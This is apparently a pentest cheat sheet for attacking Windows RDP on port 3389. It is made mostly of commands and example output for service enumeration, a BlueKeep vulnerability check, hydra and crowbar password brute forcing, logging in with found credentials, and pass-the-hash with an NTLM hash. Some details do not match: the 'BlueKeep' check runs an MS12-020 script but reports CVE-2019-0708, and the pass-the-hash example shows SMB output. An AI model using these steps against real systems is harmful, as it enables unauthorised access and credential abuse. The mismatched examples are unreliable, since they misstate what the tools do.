# RDP (3389)

### Check if accessible

```bash
nmap --script rdp-* -p 3389 $IP
```

> RDP enum scripts

**Why:** Version, encryption, NLA

<details>
<summary>Example Output</summary>

```
nmap --script rdp-* -p 3389 10.10.10.5
| rdp-ntlm-info:
|   Target: TARGET
|   DNS: target.corp.local
|   OS: Windows Server 2019
|   NLA: Enabled
```
</details>

---

### BlueKeep check

```bash
nmap --script rdp-vuln-ms12-020 -p 3389 $IP
```

> CVE-2019-0708

**Why:** Pre-auth RCE if unpatched

<details>
<summary>Example Output</summary>

```
| rdp-vuln-ms12-020:
|   VULNERABLE:
|   CVE:CVE-2019-0708
(Pre-auth RCE, use with caution - may BSOD)
```
</details>

---

### Brute force

```bash
hydra -l <user> -P passwords.txt rdp://$IP
```

> With known usernames

**Why:** Weak passwords

<details>
<summary>Example Output</summary>

```
hydra -l administrator -P passwords.txt rdp://10.10.10.5
[3389][rdp] host: 10.10.10.5 login: administrator password: Winter2025!

OR: crowbar -b rdp -s 10.10.10.5/32 -u admin -C passwords.txt
(crowbar is more reliable for RDP brute force)
```
</details>

---

### Connect with found creds

```bash
xfreerdp /u:<user> /p:<pass> /v:$IP
```

> Or rdesktop

**Why:** Full GUI access

<details>
<summary>Example Output</summary>

```
xfreerdp /u:admin /p:Password123 /v:10.10.10.5
[INFO] Connected to 10.10.10.5:3389
(Full GUI desktop access)
```
</details>

---

### Pass the hash

```bash
xfreerdp /u:<user> /pth:<hash> /v:$IP
```

> If you have NTLM hash

**Why:** No password needed

<details>
<summary>Example Output</summary>

```
crackmapexec smb 10.10.10.20 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
SMB  10.10.10.20  445  WEB01  [+] CORP\administrator:... (Pwn3d!)
(Admin access with just the hash)
```
</details>

---
